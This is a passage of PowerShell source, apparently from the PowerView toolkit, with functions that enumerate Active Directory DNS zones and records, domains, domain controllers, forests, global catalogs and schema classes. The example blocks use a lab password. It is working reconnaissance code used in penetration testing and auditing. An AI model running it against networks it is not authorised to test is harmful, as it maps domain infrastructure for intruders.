.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # TODO: how to implement properly? nested object?
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {
<#
.SYNOPSIS

Enumerates the Active Directory DNS records for a given zone.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty, Convert-DNSRecord  

.DESCRIPTION

Given a specific Active Directory DNS zone name, query for all 'dnsNode'
LDAP entries using that zone as the search base. Return all DNS entry results
and use Convert-DNSRecord to try to convert the binary DNS record blobs.

.PARAMETER ZoneName

Specifies the zone to query for records (which can be enumearted with Get-DomainDNSZone).

.PARAMETER Domain

The domain to query for zones, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDNSRecord -ZoneName testlab.local

Retrieve all records for the testlab.local zone.

.EXAMPLE

Get-DomainDNSZone | Get-DomainDNSRecord

Retrieve all records for all zones in the current domain.

.EXAMPLE

Get-DomainDNSZone -Domain dev.testlab.local | Get-DomainDNSRecord -Domain dev.testlab.local

Retrieve all records for all zones in the dev.testlab.local domain.

.OUTPUTS

PowerView.DNSRecord

Outputs custom PSObjects with detailed information about the DNS record entry.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName

                    # convert the record and extract the properties
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        # TODO: handle multiple nested records properly?
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {
<#
.SYNOPSIS

Returns the domain object for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-Domain -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Domain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

A complex .NET domain object.

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-DomainController {
<#
.SYNOPSIS

Return the domain controllers for the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-Domain  

.DESCRIPTION

Enumerates the domain controllers for the current or specified domain.
By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer
to search for domain controllers.

.PARAMETER Domain

The domain to query for domain controllers, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER LDAP

Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainController -Domain 'test.local'

Determine the domain controllers for 'test.local'.

.EXAMPLE

Get-DomainController -Domain 'test.local' -LDAP

Determine the domain controllers for 'test.local' using LDAP queries.

.EXAMPLE

'test.local' | Get-DomainController

Determine the domain controllers for 'test.local'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainController -Credential $Cred

.OUTPUTS

PowerView.Computer

Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.

System.DirectoryServices.ActiveDirectory.DomainController

If -LDAP isn't specified.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }

            # UAC specification for domain controllers
            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {
<#
.SYNOPSIS

Returns the forest object for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertTo-SID  

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current
forest or the forest specified with -Forest X.

.PARAMETER Forest

The forest name to query for, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-Forest -Forest external.domain

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Forest -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition
to the forest root domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($PSBoundParameters['Forest']) {
                $TargetForest = $Forest
            }
            else {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$Forest' from -Credential"
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            # otherwise use the current forest
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            # get the SID of the forest root
            if ($PSBoundParameters['Credential']) {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity "krbtgt" -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {
<#
.SYNOPSIS

Return all domains for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all domains for the current forest or the forest specified
by -Forest X.

.PARAMETER Forest

Specifies the forest name to query for domains.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target forest.

.EXAMPLE

Get-ForestDomain

.EXAMPLE

Get-ForestDomain -Forest external.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestDomain -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {
<#
.SYNOPSIS

Return all global catalogs for the current (or specified) forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Returns all global catalogs for the current forest or the forest specified
by -Forest X by using Get-Forest to retrieve the specified forest object
and the .FindAllGlobalCatalogs() to enumerate the global catalogs.

.PARAMETER Forest

Specifies the forest name to query for global catalogs.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestGlobalCatalog

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestGlobalCatalog -Credential $Cred

.OUTPUTS

System.DirectoryServices.ActiveDirectory.GlobalCatalog
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {
<#
.SYNOPSIS

Helper that returns the Active Directory schema classes for the current
(or specified) forest or returns just the schema class specified by
-ClassName X.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

Uses Get-Forest to retrieve the current (or specified) forest. By default,
the .FindAllClasses() method is executed, returning a collection of
[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
If "-FindClass X" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
result for the specified class name is returned.

.PARAMETER ClassName

Specifies a ActiveDirectorySchemaClass name in the found schema to return.

.PARAMETER Forest

The forest to query for the schema, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestSchemaClass

Returns all domain schema classes for the current forest.

.EXAMPLE

Get-ForestSchemaClass -Forest dev.testlab.local

Returns all domain schema classes for the external.local forest.

.EXAMPLE

Get-ForestSchemaClass -ClassName user -Forest external.local

Returns the user schema class for the external.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred

Returns the user schema class for the external.local domain using
the specified alternate credentials.

.OUTPUTS

[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]

An ActiveDirectorySchemaClass returned from the found schema.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
<#
.SYNOPSIS

Finds user/group/computer objects in AD that have 'outlier' properties set.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer

.DESCRIPTION

A 'reference' set of property names is calculated, either from a standard set preserved
for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
from the property names of the passed -ReferenceObject. Every user/group/computer object
(depending on determined class) are enumerated, and for each object, if the object has a
'non-standard' property set (meaning a property not held by the reference set), the object's
samAccountName, property name, and property value are output to the pipeline.

.PARAMETER ClassName

Specifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.
If -ReferenceObject is specified, this will be automatically extracted, if possible.

.PARAMETER ReferencePropertySet

Specifies an array of property names to diff against the class schema.

.PARAMETER ReferenceObject

Specicifes the PowerView user/group/computer object to extract property names
from to use as the reference set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'User'

Enumerates users in the current domain with 'outlier' properties filled in.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local

Enumerates groups in the external.local forest/domain with 'outlier' properties filled in.

.EXAMPLE

Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier

Enumerates computers in the current domain with 'outlier' properties filled in.

.OUTPUTS

PowerView.PropertyOutlier

Custom PSObject with translated object property outliers.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
